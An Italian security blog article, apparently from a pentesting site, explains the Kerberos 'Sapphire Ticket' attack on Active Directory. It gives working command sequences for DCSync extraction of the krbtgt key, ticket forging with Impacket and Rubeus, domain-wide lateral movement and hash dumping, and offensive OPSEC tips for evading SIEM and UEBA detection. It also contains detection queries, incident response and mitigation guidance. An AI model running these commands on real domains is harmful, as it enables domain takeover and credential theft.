---
title: 'Sapphire Ticket: Il Ticket Kerberos Più Stealth con S4U2Self+U2U'
slug: sapphire-ticket
description: >-
  Sapphire Ticket: il ticket Kerberos più stealth. Combina S4U2Self+U2U per il
  PAC autentico del KDC. Guida Impacket -impersonate, differenze con
  Golden/Diamond, detection e mitigazione.
image: /sapphire-ticket-active-directory-attack-hackita.webp
draft: false
date: 2026-07-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - sapphire-ticket
  - kerberos
  - S4U2Self
  - krbtgt
---

# Sapphire Ticket Attack: Il Ticket Kerberos Più Stealth in Assoluto

**Se sei alle prime armi:** In Active Directory, l'autenticazione passa per Kerberos — un sistema di "biglietti" (ticket) che provano la tua identità senza ritrasmettere la password ogni volta. Il KDC (Key Distribution Center), che gira sui Domain Controller, emette questi ticket. Il Sapphire Ticket è una tecnica che finge di essere un utente privilegiato (es. Domain Admin) creando un ticket praticamente identico a uno emesso dal KDC stesso — ma senza averne l'autorizzazione. È la variante più sofisticata di una famiglia di attacchi che comprende [Golden Ticket](https://hackita.it/articoli/golden-ticket/), [Silver Ticket](https://hackita.it/articoli/silver-ticket/) e [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/). Per capirlo a fondo, è utile conoscere prima come funziona [Kerberos](https://hackita.it/articoli/kerberos/).

> **TL;DR:** Il Sapphire Ticket usa S4U2Self+U2U — due estensioni del protocollo Kerberos — per ottenere il PAC (Privilege Attribute Certificate, cioè la lista dei gruppi) di un utente privilegiato **direttamente dal KDC**, senza mai forgiarlo. Quel PAC autentico viene iniettato nel proprio TGT legittimo e re-firmato con l'hash krbtgt. Il risultato: AS-REQ reale nei log, PAC completamente autentico, attributi identici a quelli del KDC. La variante più difficile da rilevare della serie. Creato da Charlie Bromberg (@ShutdownRepo, 2022).

***

## Glossario rapido

Per il protocollo Kerberos completo vedi [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/).

* **S4U2Self (Service for User to Self)**: Estensione Kerberos che permette a un servizio di richiedere un TGS per sé stesso a nome di un altro utente — senza conoscerne la password. Il KDC restituisce un TGS che include il PAC autentico dell'utente impersonato.
* **U2U (User-to-User authentication)**: Estensione Kerberos che permette autenticazione tra due utenti senza una chiave di servizio a lungo termine. Invece di cifrare il TGS con la chiave di un servizio, lo cifra con la session key di un TGT — accessibile solo a chi ha quel TGT.
* **S4U2Self+U2U (la combinazione chiave)**: S4U2Self normalmente richiede un SPN. Combinato con U2U, bypassa questo requisito: il TGS viene cifrato con la session key del TGT dell'attaccante invece di una service key. Il PAC risultante è quello del KDC per l'utente privilegiato — completamente autentico.
* **ENC-TKT-IN-SKEY**: Flag Kerberos nella TGS-REQ che indica una richiesta U2U. Quando presente, il KDC cifra il TGS con la session key del TGT invece della service key. È la fingerprint principale del Sapphire Ticket nei log.
* **additional-tickets**: Campo nella TGS-REQ che contiene il TGT dell'attaccante — necessario per U2U. Il KDC usa la session key di questo TGT per cifrare il TGS risposta.

***

## Kerberos internals: il flusso S4U2Self+U2U

**Come ottiene il PAC autentico senza forgiarlo:**

```
1. Attaccante ──AS-REQ (utente low-priv)──► KDC ──AS-REP (TGT_low)──► Attaccante
   [4768 nel log — normale]

2. Attaccante ──TGS-REQ (speciale)──► KDC
   │  PA_FOR_USER = 'Administrator'     ← chi vuoi impersonare
   │  ENC-TKT-IN-SKEY flag = true       ← U2U: cifra con session key, non service key
   │  additional-tickets = TGT_low      ← il KDC usa questa session key
   │  sname = utente_low               ← punta all'attaccante stesso (non a un servizio)
   └─► [4769 nel log — ma con sname insolito e ENC-TKT-IN-SKEY]

3. KDC ──TGS-REP──► Attaccante
   │  TGS cifrato con session key di TGT_low
   │  PAC DENTRO = PAC AUTENTICO di Administrator
   └─► Attaccante decripta con la propria session key → ottiene PAC Administrator

4. Attaccante ──[decripta TGT_low con krbtgt key]──► TGT_low struttura
   Attaccante ──[sostituisce PAC con PAC Administrator]──► TGT_modificato
   Attaccante ──[re-firma con krbtgt key]──► TGT_Sapphire

5. Attaccante ──TGT_Sapphire──► KDC ──TGS-REP──► Servizio ──► Accesso come DA
```

**La differenza critica vs Diamond:** Il Diamond *modifica* il PAC (aggiunge gruppi → discrepanza rilevabile). Il Sapphire *sostituisce* il PAC con uno che il KDC ha generato lui stesso per Administrator — nessuna discrepanza, perché è il PAC autentico.

***

## Introduzione

Il Sapphire Ticket è classificato **[T1558.001](https://attack.mitre.org/techniques/T1558/001/) (MITRE ATT\&CK)** — stessa categoria di Golden e Diamond, in quanto evoluzione della stessa famiglia. Introdotto da Charlie Bromberg (@ShutdownRepo) come estensione del codice Impacket, rappresenta la frontiera attuale delle tecniche di ticket forging Kerberos.

**Dove si posiziona rispetto alle altre tecniche:**

| Tecnica                                                       | Hash richiesto  | PAC                         | AS-REQ nei log | Richiede DA? | Difficoltà detection |
| ------------------------------------------------------------- | --------------- | --------------------------- | -------------- | ------------ | -------------------- |
| [Silver Ticket](https://hackita.it/articoli/silver-ticket/)   | Service account | Forgiato                    | No             | No           | Media                |
| [Golden Ticket](https://hackita.it/articoli/golden-ticket/)   | krbtgt          | Forgiato                    | No             | Sì           | Alta                 |
| [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) | krbtgt          | Parzialmente autentico      | Sì             | Sì           | Molto alta           |
| **Sapphire Ticket**                                           | krbtgt          | **Completamente autentico** | **Sì**         | **Sì**       | **Massima**          |

Il Sapphire è il punto finale dell'evoluzione: ogni variante precedente lascia una traccia forgiata nel PAC. Il Sapphire non ne lascia nessuna — il PAC è firmato dal KDC stesso.

***

## Sapphire vs Diamond: la differenza che conta

|                               | [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) | Sapphire Ticket                           |
| ----------------------------- | ------------------------------------------------------------- | ----------------------------------------- |
| Come ottiene il PAC           | Modifica il PAC legittimo (aggiunge gruppi)                   | Ottiene il PAC autentico via S4U2Self+U2U |
| PAC firmato da                | Attaccante (con krbtgt key)                                   | **KDC stesso** per l'utente target        |
| Discrepanza PAC rilevabile    | Sì (gruppi non corrispondono ad AD)                           | **No** (PAC autentico)                    |
| Richiede Domain SID esplicito | Sì                                                            | No (estratto dal TGT)                     |
| Richiede User RID esplicito   | Sì (ticketuserid)                                             | No (nel PAC)                              |
| Comunicazione col DC          | Sì (AS-REQ)                                                   | Sì (AS-REQ + TGS-REQ U2U)                 |
| Flag anomali nei log          | KDCOptions (senza /opsec)                                     | **ENC-TKT-IN-SKEY** in 4769               |
| Completamente offline         | No                                                            | No                                        |
| Tool principale               | Rubeus, Impacket                                              | **Impacket** (supporto nativo)            |

**Quando scegliere Sapphire invece di Diamond:**

* Hai MDI configurato per **PAC anomaly detection** → il Diamond viene rilevato, il Sapphire no.
* Vuoi il massimo di autenticità senza fornire manualmente User RID e Domain SID.
* Hai credenziali low-privilege e krbtgt key, nient'altro.

**Quando Diamond può essere preferibile:**

* Hai bisogno di Rubeus (più tooling Windows nativo disponibile).
* L'ambiente non ha PAC validation avanzata → Diamond con `/ldap /opsec` è sufficiente.
* Vuoi la variante Diamond+Silver TGS stealth.

***

## Come funziona in dettaglio

Il flusso completo si divide in due fasi distinte:

**Fase 1 — Estrazione del PAC autentico:**

1. Richiedi un TGT per te stesso (utente low-privilege) via AS-REQ → ottieni `TGT_low` con session key `SK_low`.
2. Invia una TGS-REQ speciale con:
   * `PA_FOR_USER` = nome dell'utente privilegiato da impersonare (Administrator)
   * `ENC-TKT-IN-SKEY` = true (flag U2U)
   * `additional-tickets` = `TGT_low`
   * `sname` = tuo nome utente (non un servizio)
3. Il KDC genera un TGS con il PAC di Administrator e lo cifra con `SK_low`.
4. Decripti il TGS con `SK_low` → ottieni il PAC autentico di Administrator.

**Fase 2 — Iniezione del PAC nel TGT:**
5\. Decripti `TGT_low` con la chiave krbtgt (che hai).
6\. Sostituisci il PAC di `TGT_low` con quello autentico di Administrator.
7\. Re-firmi il TGT con la chiave krbtgt → `TGT_Sapphire`.
8\. Inietti `TGT_Sapphire` nella sessione → sei Administrator su tutto il dominio.

> **Nota tecnica:** Il PAC estratto via S4U2Self+U2U è tecnicamente un PAC da TGS (service ticket), che include campi leggermente diversi rispetto a un PAC da TGT (mancano `PAC_REQUESTOR_SID` e `PAC_ATTRIBUTES_INFO` nel formato TGT). Impacket gestisce questa differenza internamente. In ambienti aggiornati con strict PAC validation, questa discrepanza può essere rilevata — ma è rara di default.

***

## Prerequisiti

* Hash krbtgt **AES256** (preferito) — stesso delle tecniche Golden e Diamond
* Credenziali di **qualsiasi utente di dominio** (anche low-privilege, basta un account valido)
* FQDN del dominio e IP del DC

> **Vantaggio vs Golden/Diamond:** Non hai bisogno di Domain SID esplicito né del RID dell'utente da impersonare — vengono estratti automaticamente dal PAC ottenuto via S4U2Self+U2U.

```powershell
# Estrai krbtgt AES256 key via DCSync (richiede DA o diritti di replica)
# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
# → * AES256 HMAC Key: <64 char hex>

# Impacket da Linux
impacket-secretsdump corp.local/Administrator:pass@DC_IP -just-dc-user krbtgt
# → krbtgt:aes256-cts-hmac-sha1-96:<64 char hex>
```

> **NTLM ≠ AES256:** Non esiste conversione diretta. Usa sempre DCSync per estrarre le chiavi AES. Vedi [DCSync](https://hackita.it/articoli/dcsync/).

***

## Step 1 — Ottieni TGT base e PAC privilegiato

Impacket gestisce tutto automaticamente con `-request -impersonate`. Non devi fare i due step manualmente.

```bash
# Impacket ticketer.py — Sapphire Ticket completo
# -request         → esegue AS-REQ per ottenere TGT reale
# -impersonate     → esegue S4U2Self+U2U per ottenere PAC di Administrator

python3 ticketer.py \
  -request \
  -impersonate 'Administrator' \
  -domain corp.local \
  -user utente_low \
  -password Password123 \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  utente_low
# Output: utente_low.ccache con TGT modificato con PAC autentico di Administrator
```

***

## Step 2 — Forgiare il Sapphire Ticket

### Con Impacket da Linux (metodo principale)

**ticketer.py** di [Impacket](https://hackita.it/articoli/impacket/) ha supporto nativo per il Sapphire Ticket tramite la combinazione `-request` + `-impersonate` (implementato da ShutdownRepo, PR #1411 su Impacket):

```bash
# Forma completa
python3 ticketer.py \
  -request \
  -impersonate 'Administrator' \
  -domain corp.local \
  -user utente_low \
  -password Password123 \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  utente_low

export KRB5CCNAME=utente_low.ccache

# Verifica: il ticket deve avere i gruppi DA di Administrator
klist -v
# → Groups: 512 (Domain Admins), 519 (Enterprise Admins), ecc.

# Accesso immediato
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@DC01.corp.local
```

```bash
# Con hash NTLM invece di password
python3 ticketer.py \
  -request \
  -impersonate 'Administrator' \
  -domain corp.local \
  -user utente_low \
  -hashes :NTLM_HASH_UTENTE_LOW \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  utente_low

# Con chiave AES dell'utente low (più stealth — no RC4)
python3 ticketer.py \
  -request \
  -impersonate 'Administrator' \
  -domain corp.local \
  -user utente_low \
  -aesKey-user AES256_KEY_UTENTE_LOW \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  utente_low
```

### Con Rubeus (approccio alternativo)

Rubeus non ha un subcommand `sapphire` dedicato, ma puoi replicare il meccanismo manualmente:

```powershell
# Step 1: ottieni TGT low-privilege
Rubeus.exe asktgt /user:utente_low /password:Password123 /domain:corp.local /enctype:aes256 /nowrap

# Step 2: S4U2Self+U2U per PAC di Administrator
Rubeus.exe s4u /ticket:BASE64_TGT_LOW /self /impersonateuser:Administrator /altservice:host /u2u /nowrap
# → ottieni TGS con PAC autentico di Administrator

# Step 3: inietta il TGS come base per diamond/sapphire
# In pratica: usa Impacket per il Sapphire completo su Linux
# Rubeus ha Diamond con /ldap /opsec come alternativa pratica su Windows
```

> In ambienti Windows dove preferisci restare su Rubeus, usa **Diamond Ticket con `/ldap /opsec`** — è quasi equivalente per stealth. Il Sapphire puro è più facilmente gestibile da Linux con Impacket.

### Conversione .ccache ↔ .kirbi

```bash
impacket-ticketConverter utente_low.ccache sapphire.kirbi
impacket-ticketConverter sapphire.kirbi utente_low.ccache
```

***

## Step 3 — Lateral Movement e verifica

```bash
# Linux — verifica ticket
klist
# → utente_low @ CORP.LOCAL con sessione Administrator

export KRB5CCNAME=utente_low.ccache

# Exec remoto
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET
impacket-smbexec -k -no-pass corp.local/Administrator@TARGET

# DCSync con il ticket
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local

# NetExec su subnet intera
netexec smb 192.168.1.0/24 --use-kcache -x 'whoami'
```

```powershell
# Windows — dopo aver convertito in .kirbi
kerberos::ptt sapphire.kirbi
klist
dir \\DC01\C$
```

***

## OPSEC offensiva

**ENC-TKT-IN-SKEY è la fingerprint principale**
La richiesta S4U2Self+U2U genera un Event ID 4769 con `ENC-TKT-IN-SKEY` flag e `sname` che punta a un utente invece di un servizio. Questo è raro in ambienti legittimi e può triggerare alert se il SIEM è configurato per monitorarlo. Nella realtà, pochi ambienti hanno questa regola attiva.

**Usa chiave AES dell'utente low**
Se usi password o NTLM hash per l'AS-REQ, il tipo di encryption può essere RC4 — anomalo nei domini moderni. Usa `-aesKey-user` per forzare AES256 nell'AS-REQ iniziale.

**Timing**
La sequenza AS-REQ → TGS-REQ U2U → accesso privilegiato avviene in pochi secondi. In ambienti con UEBA, un utente low-privilege che immediatamente accede a risorse DA è anomalo. Aspetta qualche minuto tra l'AS-REQ e l'accesso, o usa un account con storia di accesso legittima.

**Non fare DCSync e Sapphire dalla stessa macchina**
Come per il Diamond Ticket, la correlazione DCSync + ticket privilegiato dallo stesso IP è immediata per un analista. Esegui DCSync da un percorso diverso o da un account con diritti di replica legittimi.

**Il nome file del ccache**
Il ccache prodotto ha il nome dell'utente low-privilege. Rinominalo in qualcosa di meno sospetto prima di esportarlo o trasferirlo.

***

## Limiti ed errori comuni

* **`-domain-sid` obbligatorio in Impacket**: Anche se il PAC viene estratto automaticamente, Impacket richiede il Domain SID per costruire la richiesta. Recuperalo con `impacket-lookupsid` o da `whoami /user`.
* **PAC\_REQUESTOR\_SID e PAC\_ATTRIBUTES\_INFO**: Il PAC estratto via TGS ha campi leggermente diversi da un PAC TGT nativo. In ambienti con strict PAC validation questa discrepanza può essere rilevata. Estremamente raro di default, ma possibile su sistemi molto hardened (Windows Server 2022 con PAC validation abilitata).
* **Richiede comunicazione col KDC**: Non è offline come Golden Ticket. Se il DC non è raggiungibile, usa Golden.
* **Credenziali utente low valide**: L'AS-REQ iniziale richiede credenziali valide. Account scaduti, bloccati o con password errata → AS-REQ fallisce.
* **`-aesKey-user` non sempre disponibile**: Dipende dalla versione di Impacket. Verifica con `python3 ticketer.py --help`.
* **Clock Skew**: Stessa tolleranza Kerberos — 5 minuti. Verifica NTP prima di procedere.

***

## Scenario reale

Un red teamer ha accesso a un account helpdesk con credenziali valide (`helpdesk:Welcome1`) e ha già estratto l'hash AES256 di krbtgt tramite DCSync da un percorso separato.

L'ambiente ha MDI con PAC anomaly detection attiva — il Diamond Ticket genera alert per discrepanza gruppi. Il Golden Ticket genera alert per assenza AS-REQ.

```bash
# Step 1 — Sapphire Ticket (MDI non rileva discrepanze PAC)
python3 ticketer.py \
  -request -impersonate 'Administrator' \
  -domain corp.local \
  -user helpdesk -password Welcome1 \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  helpdesk

export KRB5CCNAME=helpdesk.ccache

# Step 2 — DCSync completo
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
# → tutti gli hash del dominio

# Step 3 — Golden Ticket per persistenza a lungo termine
# Ora hai il krbtgt che avevi già + tutti gli hash
```

**Cosa vede MDI:** AS-REQ legittimo per helpdesk (4768), TGS-REQ con ENC-TKT-IN-SKEY (4769 — anomalo ma non bloccato senza regola specifica), accesso al DC (4624). Nessun alert PAC perché il PAC è autentico.

***

## Detection

Il Sapphire Ticket è la tecnica più difficile da rilevare della serie. I segnali sono specifici e richiedono monitoring avanzato.

**🔴 HIGH — Segnali critici:**

* **Event ID 4769 con `ENC-TKT-IN-SKEY` flag**: Questo è il segnale più affidabile del Sapphire Ticket. Una TGS-REQ con questo flag indica U2U authentication — rara in ambienti normali. Configurare un alert su tutte le 4769 con questo campo è la detection più efficace.

```kql
// Sapphire Ticket detection — U2U requests anomale
SecurityEvent
| where EventID == 4769
| where TicketOptions has "0x20000000"   // ENC-TKT-IN-SKEY flag
| where ServiceName !in ("krbtgt", "kadmin", "kpasswd")  // Escludi legittimi
| project TimeGenerated, TargetUserName, ServiceName, ClientIPAddress, TicketOptions
| sort by TimeGenerated desc
```

* **4769 con `sname` = account utente** (non un SPN di servizio): Una TGS-REQ verso un nome utente invece di `MSSQLSvc/host`, `cifs/host`, ecc. è anomala.
* **Sequenza 4768 (AS-REQ) → 4769 U2U → 4624 DA su risorse critiche** in pochi secondi per un account low-privilege.

**🟡 MEDIUM — Segnali secondari:**

* Account low-privilege che accede a risorse da Domain Admin subito dopo un AS-REQ.
* `additional-tickets` presente in TGS-REQ (campo Kerberos che indica U2U) — rilevabile tramite network capture (Kerberos traffic su porta 88).
* UEBA: utente helpdesk che in 30 secondi fa AS-REQ e poi accede a `\\DC01\C$` → anomalia comportamentale.

**Microsoft Defender for Identity:**
MDI ha detection per Sapphire Ticket tramite correlazione dei flussi U2U + PAC validation. L'alert "Suspected Golden Ticket usage" può scattare se la correlazione PAC mostra un privilegio non coerente con la history dell'account.

> **Nota ambienti ibridi:** Per ambienti con Azure AD Connect, aggiungi correlazione su `IdentityLogonEvents` in M365 Defender per rilevare eventuali pivot verso il cloud successivi al Sapphire Ticket on-prem.

***

## Ambienti ibridi: Sapphire Ticket e Azure AD

Come Golden e Diamond, il Sapphire Ticket è **esclusivamente on-premise**. Non dà accesso diretto a risorse cloud.

| Risorsa                     | Sapphire Ticket funziona?                          |
| --------------------------- | -------------------------------------------------- |
| DC on-prem / file server    | ✅ Sì                                               |
| Exchange on-prem            | ✅ Sì                                               |
| SharePoint Online / M365    | ❌ No (OAuth2)                                      |
| Azure VM Azure-joined       | ❌ No                                               |
| **Azure AD Connect server** | ⚠️ On-prem → accesso al server = pivot verso cloud |
| **AD FS**                   | ⚠️ On-prem → pivot verso token SAML cloud          |

Il Sapphire Ticket può compromettere i server ibridi on-prem che fanno da bridge verso Azure AD. Se usi il Sapphire Ticket per accedere all'Azure AD Connect server e dumparne le credenziali (`MSOL_XXXXXXXXXX`), ottieni accesso al tenant Azure AD con privilegi di sincronizzazione — da lì puoi pivotare verso risorse cloud.

***

## Incident Response

Stessa remediation di Golden e Diamond — l'hash krbtgt è compromesso.

1. **Identifica il pattern U2U nei log**: Event ID 4769 con `ENC-TKT-IN-SKEY` → questo è il Sapphire Ticket. Identifica l'account low-privilege usato per l'AS-REQ.
2. **Doppio reset di krbtgt:**

```powershell
Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd1!" -AsPlainText -Force)
# → attendi 10-12 ore
Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd2!" -AsPlainText -Force)

# Script ufficiale
.\New-KrbtgtKeys.ps1 -DomainFQDN corp.local -ResetType Twice
```

> `klist purge` non invalida il Sapphire Ticket. Solo il reset di krbtgt lo invalida.

1. **Resetta le credenziali dell'account low-privilege** usato per l'AS-REQ iniziale.
2. **Hunting sulle persistenze**: Scheduled task, WMI, account backdoor, SIDHistory anomala sui DC.
3. **Abilita monitoring ENC-TKT-IN-SKEY** post-incident come regola SIEM permanente.
4. **Review Azure AD Connect** se presente — verifica che le credenziali `MSOL_XXXXXXXXXX` non siano state estratte.

***

## Mitigazione e prevenzione

* **Proteggi l'hash krbtgt** — è il requisito fondamentale per tutti i ticket della serie. Vedi [Golden Ticket](https://hackita.it/articoli/golden-ticket/) per la catena completa verso krbtgt.
* **Doppio reset krbtgt periodico** (almeno semestrale). Usa [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1).
* **Monitora Event ID 4769 con `ENC-TKT-IN-SKEY`**: È il segnale più specifico del Sapphire Ticket. Imposta un alert SIEM su tutte le 4769 con questo flag — sono rarissime in ambienti normali.
* **Monitora [DCSync](https://hackita.it/articoli/dcsync/)** (Event ID 4662) in tempo reale — l'hash krbtgt arriva tipicamente via DCSync.
* **Microsoft Defender for Identity**: Configura gli alert per T1558.001 e verifica che PAC validation e U2U anomaly siano inclusi.
* **PAC validation** sui servizi critici: Può rilevare la discrepanza tra PAC TGT e PAC TGS (campi `PAC_REQUESTOR_SID` e `PAC_ATTRIBUTES_INFO`) — raro ma efficace.
* **AES-only enforcement** (`msDS-SupportedEncryptionTypes = 24`): Non previene il Sapphire ma forza AES, riducendo i vettori di downgrade. CVE-2026-20833 (Microsoft 2026) sta accelerando il phase-out di RC4 nei service ticket.
* **Mappa i path verso krbtgt con [BloodHound](https://hackita.it/articoli/bloodhound/)** e rimuovi deleghe non necessarie.
* **Network monitoring porta 88**: Cattura Kerberos traffic e cerca pacchetti con `additional-tickets` + `ENC-TKT-IN-SKEY` — è l'unico modo per rilevare il Sapphire Ticket senza MDI.

***

## Confronto: Silver / Golden / Diamond / Sapphire

|                        | [Silver Ticket](https://hackita.it/articoli/silver-ticket/) | [Golden Ticket](https://hackita.it/articoli/golden-ticket/) | [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) | **Sapphire Ticket**      |
| ---------------------- | ----------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------- | ------------------------ |
| Hash richiesto         | Service account                                             | krbtgt                                                      | krbtgt                                                        | krbtgt                   |
| TGT di partenza        | N/A                                                         | Forgiato offline                                            | Reale (AS-REQ)                                                | Reale (AS-REQ)           |
| Come ottiene PAC       | Forgiato                                                    | Forgiato                                                    | Modifica legittimo                                            | **KDC via S4U2Self+U2U** |
| PAC autentico          | No                                                          | No                                                          | Parzialmente                                                  | **Sì (completamente)**   |
| AS-REQ nei log         | No                                                          | No                                                          | Sì                                                            | Sì                       |
| TGS-REQ U2U nei log    | No                                                          | No                                                          | No                                                            | **Sì (ENC-TKT-IN-SKEY)** |
| Richiede DA?           | No                                                          | Sì                                                          | Sì                                                            | Sì                       |
| Richiede Domain SID    | Sì                                                          | Sì                                                          | Sì                                                            | Opzionale¹               |
| Richiede User RID      | N/A                                                         | Sì                                                          | Sì                                                            | **No**                   |
| Completamente offline  | Sì                                                          | Sì                                                          | No                                                            | No                       |
| Tool principale        | Mimikatz, Rubeus, Impacket                                  | Mimikatz, Rubeus, Impacket                                  | Rubeus, Impacket                                              | **Impacket**             |
| Rilevazione principale | 4624 senza 4769 DC                                          | Assenza AS-REQ                                              | PAC mismatch                                                  | ENC-TKT-IN-SKEY in 4769  |
| Remediation            | Reset service account                                       | Doppio reset krbtgt                                         | Doppio reset krbtgt                                           | Doppio reset krbtgt      |
| Difficoltà detection   | Media                                                       | Alta                                                        | Molto alta                                                    | **Massima**              |

¹ *Impacket lo richiede nella CLI ma lo estrae automaticamente dal PAC — non devi conoscerlo a priori.*

***

## Quick Reference

**1. Estrai krbtgt AES256 key via [DCSync](https://hackita.it/articoli/dcsync/):**

```bash
impacket-secretsdump corp.local/Administrator:pass@DC_IP -just-dc-user krbtgt
# → krbtgt:aes256-cts-hmac-sha1-96:<64 char hex>
```

**2. Sapphire Ticket con Impacket:**

```bash
python3 ticketer.py -request -impersonate 'Administrator' \
  -domain corp.local -user utente_low -password Password123 \
  -aesKey KRBTGT_AES256_KEY -domain-sid S-1-5-21-XXXXXXXXXX \
  utente_low
export KRB5CCNAME=utente_low.ccache
```

**3. Lateral movement:**

```bash
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
netexec smb 192.168.1.0/24 --use-kcache --sam
```

**4. Detection query (KQL — Sentinel):**

```kql
SecurityEvent
| where EventID == 4769 and TicketOptions has "0x20000000"
| project TimeGenerated, TargetUserName, ServiceName, ClientIPAddress
```

**5. Remediation:**

```powershell
.\New-KrbtgtKeys.ps1 -DomainFQDN corp.local -ResetType Twice
```

***

## FAQ

**Sapphire o Diamond — quale scegliere?**
Se MDI ha PAC anomaly detection attiva → Sapphire. Se sei su Windows e preferisci Rubeus → Diamond con `/ldap /opsec`. La differenza di stealth in ambienti senza MDI avanzato è minima.

**Il Sapphire Ticket bypassa PAC validation?**
No. Se PAC validation è attiva, il confronto tra PAC TGT e PAC TGS può rilevare la discrepanza dei campi `PAC_REQUESTOR_SID`. In pratica raro, ma possibile.

**Non ho credenziali low-privilege — posso fare lo stesso?**
No. Il Sapphire richiede un AS-REQ reale con credenziali valide. Senza credenziali usa Golden Ticket (completamente offline).

**L'ENC-TKT-IN-SKEY appare sempre nei log?**
Sì, 4769 con questo flag è sempre generato. La domanda è se il tuo SIEM ha una regola per rilevarlo — la maggior parte no. Configurare questa regola è la mitigazione più semplice ed efficace.

**Perché Rubeus non ha `sapphire` come comando diretto?**
Il Sapphire Ticket è stato implementato principalmente in Impacket da ShutdownRepo. Rubeus ha Diamond con `/ldap /opsec` come equivalente pratico su Windows — il risultato finale è simile anche se il meccanismo differisce.

**Stessa remediation degli altri?**
Sì. Doppio reset krbtgt + reset account low-privilege usato per l'AS-REQ. Nessuna eccezione.

***

## Mappazione MITRE ATT\&CK

| Tattica           | Tecnica                                                         | Descrizione                                             |
| ----------------- | --------------------------------------------------------------- | ------------------------------------------------------- |
| Credential Access | **[T1558.001](https://attack.mitre.org/techniques/T1558/001/)** | Sapphire/Diamond/Golden Ticket (Forge Kerberos Tickets) |
| Credential Access | **[T1003.006](https://attack.mitre.org/techniques/T1003/006/)** | DCSync (per ottenere krbtgt hash)                       |
| Lateral Movement  | **[T1550.003](https://attack.mitre.org/techniques/T1550/003/)** | Pass the Ticket                                         |
| Lateral Movement  | **[T1021.002](https://attack.mitre.org/techniques/T1021/002/)** | SMB/Admin Shares                                        |
| Persistence       | **[T1078](https://attack.mitre.org/techniques/T1078/)**         | Valid Accounts                                          |

***

## Takeaway finale

1. **Il Sapphire Ticket è il punto finale dell'evoluzione**: Golden (tutto forgiato) → Diamond (PAC modificato) → Sapphire (PAC autentico dal KDC). Ogni step riduce le tracce forgiabili.
2. **L'unica fingerprint rilevabile è ENC-TKT-IN-SKEY nei log 4769** — rara di default, ma semplice da monitorare se sai cosa cercare.
3. **La difesa rimane sempre la stessa**: proteggi l'hash krbtgt. Se l'hash non esce, Golden, Diamond e Sapphire non esistono.
4. **Stessa remediation per tutta la serie**: doppio reset krbtgt. Nessuna eccezione.

***

## Conclusione

Il Sapphire Ticket chiude la serie delle tecniche di ticket forging Kerberos con la variante più sofisticata disponibile nel 2026. Dove il Golden Ticket lascia l'assenza di AS-REQ e il Diamond lascia un PAC con gruppi inventati, il Sapphire non lascia nessuna delle due tracce — il PAC è firmato dal KDC stesso per l'utente privilegiato.

Questo non significa che sia invisibile. ENC-TKT-IN-SKEY nei log 4769 è un segnale chiaro per chi sa cosa cercare. La differenza è che pochi ambienti hanno questa regola configurata.

Il pattern di questa serie Kerberos è sempre lo stesso: ogni mitigazione genera una variante più sofisticata. La risposta difensiva non può inseguire ogni nuova tecnica — deve partire dalla protezione dell'asset critico: l'hash krbtgt. Se non esce, l'intera serie Golden/Silver/Diamond/Sapphire non esiste.

***

## Articoli correlati

* [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/)
* [Golden Ticket](https://hackita.it/articoli/golden-ticket/)
* [Silver Ticket](https://hackita.it/articoli/silver-ticket/)
* [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/)
* [Impacket](https://hackita.it/articoli/impacket/)
* [Rubeus](https://hackita.it/articoli/rubeus/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [NetExec](https://hackita.it/articoli/netexec/)
* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)

***

## Fonti e riferimenti esterni

* [MITRE ATT\&CK – T1558.001: Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/001/)
* [ShutdownRepo – Sapphire Ticket PR #1411 (Impacket)](https://github.com/fortra/impacket/pull/1411)
* [The Hacker Recipes – Sapphire Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [Palo Alto Unit42 – Precious Gemstones: Next-Gen Kerberos Attacks](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
* [HackTricks – Diamond Ticket (include Sapphire)](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html)
* [Microsoft – New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1)

> Uso esclusivo in ambienti autorizzati.

\#sapphire-ticket #kerberos #active-directory #windows #S4U2Self #U2U #persistence
